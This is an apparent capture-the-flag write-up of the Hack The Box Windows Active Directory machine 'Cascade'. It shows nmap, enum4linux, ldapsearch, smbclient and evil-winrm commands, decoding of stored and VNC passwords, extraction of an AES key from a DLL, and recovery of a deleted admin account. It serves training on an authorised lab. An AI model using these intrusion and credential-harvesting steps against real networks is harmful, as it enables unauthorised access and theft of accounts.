@@ -1,0 +1,221 @@
+I"�1<p class="lead"><strong><em>“Your most unhappy customers are your greatest source of learning.</em></strong>” - Bill Gates</p>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/machine.jpeg" alt="" /></p>
+
+<ul class="large-only" id="markdown-toc">
+  <li><a href="#machine-matrix" id="markdown-toc-machine-matrix">Machine Matrix</a></li>
+  <li><a href="#machine-summary" id="markdown-toc-machine-summary">Machine Summary</a></li>
+  <li><a href="#nmap-scan" id="markdown-toc-nmap-scan">Nmap Scan</a></li>
+  <li><a href="#enumeration-on-port-139-and-445" id="markdown-toc-enumeration-on-port-139-and-445">Enumeration on port 139 and 445</a></li>
+  <li><a href="#enumerating-using-ldap-queries" id="markdown-toc-enumerating-using-ldap-queries">Enumerating Using LDAP Queries</a></li>
+  <li><a href="#enumerating-shares-with-rthompson-credentials" id="markdown-toc-enumerating-shares-with-rthompson-credentials">Enumerating Shares with r.thompson credentials</a></li>
+  <li><a href="#acquiring-user-shell---ssmith" id="markdown-toc-acquiring-user-shell---ssmith">Acquiring User Shell - s.smith</a></li>
+  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li>
+  <li><a href="#disassembling-cascauditexe-and-casccryptodll" id="markdown-toc-disassembling-cascauditexe-and-casccryptodll">Disassembling CascAudit.exe and CascCrypto.dll</a></li>
+  <li><a href="#acquiring-administrator-access" id="markdown-toc-acquiring-administrator-access">Acquiring Administrator Access</a></li>
+</ul>
+
+<h2 id="machine-matrix">Machine Matrix</h2>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/matrix.png" alt="" /></p>
+
+<h2 id="machine-summary">Machine Summary</h2>
+<p>Box is a windows machine that has Active Directory services running. Starting with, for a user account enocded password is stored in one of the account’s attributes which is retrived using ldap search. Upon enumerating the shares with the obtained credentials, VNC.reg file is witnessed from which we can crack the password for the user s.smith. Now for privilege escalation, again enumerating on shares with s.smith credentials gives us access to Audit.db that has custom encrypted password. We use the DnSpy to witness the encryption mechanisim. After decryption, we have credentials for account ArkSvc ( Service Account). We then use this account to recover a deleted account TempAdmin. Administrator’s password is same as TempAdmin.</p>
+
+<h2 id="nmap-scan">Nmap Scan</h2>
+<p>I started the enumeration with nmap scan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.182
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/1.png" alt="" /></p>
+
+<p>The Box has 13 ports open</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Port</th>
+      <th style="text-align: left">Service</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">53</td>
+      <td style="text-align: left">domain</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">88</td>
+      <td style="text-align: left">kerberos-sec</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">135</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">139</td>
+      <td style="text-align: left">netbios-ssn</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">389</td>
+      <td style="text-align: left">ldap</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">microsoft-ds</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">636</td>
+      <td style="text-align: left">tcpwrapped</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3268</td>
+      <td style="text-align: left">ldap</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3269</td>
+      <td style="text-align: left">tcpwrapped</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49154</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49155</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49157</td>
+      <td style="text-align: left">ncacn_http</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49158</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="enumeration-on-port-139-and-445">Enumeration on port 139 and 445</h2>
+<p>I used smbclient to check whether anonymous login is allowed in the machine but it was unsuccessfull. I ran enum4linux to enumerate more</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux 10.10.10.182
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/2.png" alt="" /></p>
+
+<p><strong>Usernames</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CascGuest
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+BackupSvc
+j.allen
+i.croft
+</code></pre></div></div>
+<p>I checked whether any of these users have kerberos pre-authentication disabled, that would lead us to inital foothold but that didn’t workout.</p>
+
+<h2 id="enumerating-using-ldap-queries">Enumerating Using LDAP Queries</h2>
+<p>I started to enumerate the Active Directory using LDAP Queries</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"dc=cascade,dc=local"</span> <span class="nt">-H</span> ldap://10.10.10.182
+</code></pre></div></div>
+<p>This gave a huge amount of result so i copied this result to a text file inorder to manually enumerate on it. This gave me a lead, I got a base64 encoded password in the object <strong>cascadeLegacyPwd</strong> of ryan thompson user (r.thompson)</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/3.png" alt="" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Encoded password: clk0bjVldmE=
+Decoded password: rY4n5eva
+</code></pre></div></div>
+<p>I tried to login on winrm using evilwinrm for obtained credentials but didn’t work.</p>
+
+<h2 id="enumerating-shares-with-rthompson-credentials">Enumerating Shares with r.thompson credentials</h2>
+<p>Now i tried to enumerate on the shares with the obtained credentials of r.thompson. Thompson had access to certain shared folders.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.182/ <span class="nt">-U</span> r.thompson
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/4.png" alt="" /></p>
+
+<p>I enumerated on each folders, upon enumeration i got <strong>VNC Install.reg</strong> file from \IT\Temp\s.smith\ Directory.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/5.png" alt="" /></p>
+
+<h2 id="acquiring-user-shell---ssmith">Acquiring User Shell - s.smith</h2>
+<p>I downloaded the file and started looking in to it. As it is an registry file, it had object which has the password in encoded form.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/6.png" alt="" /></p>
+
+<p>I thought it was in hex format but it wasn’t. Upon researching a bit, i got a tool for drypting the encoded password in VNC registry file. [vncpwd]https://aluigi.altervista.org/pwdrec/vncpwd.zip). I used this tool to decrypt the password</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/7.jpeg" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: s.smith
+password: sT333ve2
+</code></pre></div></div>
+<p>I used to evil-winrm to get the shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2 <span class="nt">-i</span> 10.10.10.182
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/8.png" alt="" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Again i went to enumerate on shares with s.smith credentials,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.182/Audit<span class="nv">$ </span><span class="nt">-U</span> s.smith
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/9.png" alt="" /></p>
+
+<p>There is a file called Audit.db, that may be our way for privilege escalation. I simply checked the contents on the file using strings command</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings Audit.db
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/10.jpeg" alt="" /></p>
+
+<p>I found an hash which must be the password. I tried to decrypt the hash using john and hashcat but that didn’t work. I concluded that it must be a custom encrypted password.</p>
+
+<h2 id="disassembling-cascauditexe-and-casccryptodll">Disassembling CascAudit.exe and CascCrypto.dll</h2>
+<p>On shares enumerating, we found an exec and a dll file CascAudit.exe and CascCrypto.dll. These files are used for encryption, hence these must be disassembled to find the encryption technique and decrypting it.</p>
+
+<p>I imported CascAudit.exe and CascCrypto.dll on DnSpy. I noticed that the encryption technique used is AES 128 bit with CBC mode. I got the Secret Key (c4scadek3y654321) and IV Optional Key (1tdyjCbY1Ix49842)</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/11.jpeg" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/12.jpeg" alt="" /></p>
+
+<p>I used the online AES decrypter to decrypt the password through providing the keys and the encrypted password.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/13.jpeg" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: arksvc
+password: w3lc0meFr31nd
+</code></pre></div></div>
+<p>Upon enumeration of shares using the s.smith credentials, i got an log file (ArkAdRecycleBin.log) and a html file (Meeting_Notes_June_2018.html)</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/14.png" alt="" /></p>
+
+<p>I downloaded these files and started to enumerate on it.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/15.png" alt="" /></p>
+
+<h2 id="acquiring-administrator-access">Acquiring Administrator Access</h2>
+<p>According to the log file TempAdmin User was deleted by ArkSvc user. Reading the Meeting_Notes_June_2018.html describes that the password for TempAdmin and Administrator are same.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/16.png" alt="" /></p>
+
+<p>So now if we are able to recover the TempAdmin password from the user who deleted TempAdmin (ArkSvc), we can have the administrator shell. I researched google on how to recover deleted accounts. I found a blog on how to recover the deleted accounts using powershell</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Get-ADObject</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s1">'isdeleted -eq $true -and name -ne "Deleted Objects"'</span><span class="w"> </span><span class="nt">-includeDeletedObjects</span><span class="w"> </span><span class="nt">-property</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+<p>I ran this command in the shell of ArkSvc user</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/17.png" alt="" /></p>
+
+<p>As expected we have an password encoded in base64 on the parameter cascadeLegacyPwd. I decoded it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: TempAdmin, Administrator
+password: baCT3r1aN00dles
+</code></pre></div></div>
+
+<p>I got the administrator shell using evil-winrm with these credentials</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/18.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/cascade/pwned.png" alt="" /></p>
+
+<p>Happy Hacking !</p>
+:ET
